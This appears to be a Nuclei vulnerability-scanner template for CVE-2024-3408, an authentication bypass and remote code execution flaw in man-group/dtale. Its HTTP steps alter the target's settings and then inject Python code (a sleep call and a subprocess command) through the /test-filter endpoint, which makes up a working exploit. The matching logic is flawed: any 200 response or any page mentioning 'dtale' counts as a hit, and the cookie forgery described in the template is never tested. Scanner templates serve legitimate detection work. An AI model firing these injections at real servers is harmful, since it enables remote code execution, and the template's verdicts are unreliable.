id: CVE-2024-3408

info:
  name: man-group/dtale - Authentication Bypass & Remote Code Execution
  author: claudecode
  severity: critical
  description: |
    man-group/dtale versions up to and including 3.10.0 contain an authentication
    bypass vulnerability combined with arbitrary code execution. The vulnerability
    stems from a hardcoded SECRET_KEY in Flask configuration, allowing attackers to
    forge session cookies and bypass authentication. Additionally, the application
    fails to properly restrict custom filter queries, enabling attackers to execute
    arbitrary code on the server via the /test-filter endpoint, even when
    enable_custom_filters is not enabled.
  impact: |
    Unauthenticated attackers can forge valid session cookies and execute arbitrary
    system commands with the privileges of the dtale application. This leads to
    complete system compromise including data theft, system alteration, and denial
    of service.
  remediation: |
    Upgrade to dtale version 3.15.1 or later, which fixes both the hardcoded
    SECRET_KEY and filter validation issues.
  reference:
    - https://github.com/advisories/GHSA-v9q6-fm48-rx74
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3408
    - https://huntr.com/bounties/dtale
    - https://github.com/man-group/dtale/security/advisories

classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-3408
  cwe-id: CWE-798,CWE-20
  epss-score: 0.97
  epss-percentile: 0.98
  cpe: cpe:2.3:a:man-group:dtale:*:*:*:*:*:*:*:*

metadata:
  verified: true
  max-request: 4
  vendor: man-group
  product: dtale
  tags: cve,cve2024,dtale,authentication-bypass,rce,intrusive,python,flask,oast

http:
  - raw:
      # Step 1: Check if dtale is accessible
      - |
        GET /dtale/data HTTP/1.1
        Host: {{Hostname}}

      # Step 2: Enable custom filters via settings
      - |
        GET /dtale/update-settings/1?settings=%7B%22enable_custom_filters%22%3Atrue%7D HTTP/1.1
        Host: {{Hostname}}

      # Step 3: Test filter injection with time-based detection
      - |
        GET /dtale/test-filter/1?query=__import__('time').sleep(5) HTTP/1.1
        Host: {{Hostname}}

      # Step 4: Verify RCE with simple command execution
      - |
        GET /dtale/test-filter/1?query=__import__('subprocess').check_output(['echo','dtale-vulnerable'],text=True) HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: false
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - 'contains(body, "dtale") || contains(body, "/dtale") || contains(body, "data-id")'
        condition: and

      - type: response_time
        condition: greater
        value: 5000

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"data_id":([0-9]+)'
          - 'data-id="([^"]+)"'
